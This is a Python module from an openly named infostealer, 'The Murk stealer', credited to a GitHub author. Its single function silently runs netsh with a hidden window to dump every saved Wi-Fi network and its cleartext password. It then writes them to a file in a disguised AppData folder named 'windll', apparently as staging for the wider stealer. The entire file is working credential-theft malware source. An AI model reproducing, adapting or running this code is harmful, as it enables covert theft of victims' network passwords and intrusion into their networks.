#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
import subprocess
import re
import os

def Wifi():
    pathtofile = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\windll'
    logs = []
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    profiles_output = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True, startupinfo=startupinfo)
    profile_names = re.findall(r':\s(.+)', profiles_output.stdout)

    wifi_passwords = {}

    for profile in profile_names:
        password_output = subprocess.run(['netsh', 'wlan', 'show', 'profile', 'name=' + profile, 'key=clear'], capture_output=True, text=True, startupinfo=startupinfo)
        password = re.search(r'Key Content\s+:\s(.+)', str(password_output.stdout))

        if password:
            wifi_passwords[profile] = password.group(1)
        else:
            wifi_passwords[profile] = None

    passwords = wifi_passwords

    for profile, password in passwords.items():
        profile = profile.encode('cp1251', errors='ignore').decode('utf-8', errors='ignore')
        if password != None:
            password = password.encode('cp1251', errors='ignore').decode('utf-8', errors='ignore')

        logs.append(f'Wi-Fi Network: {profile}\nPassword: {password}\n')

    with open(pathtofile+"\\System\\wifi.txt", 'w', encoding='UTF-8') as f:
        for log in logs:
            f.write(log+'\n')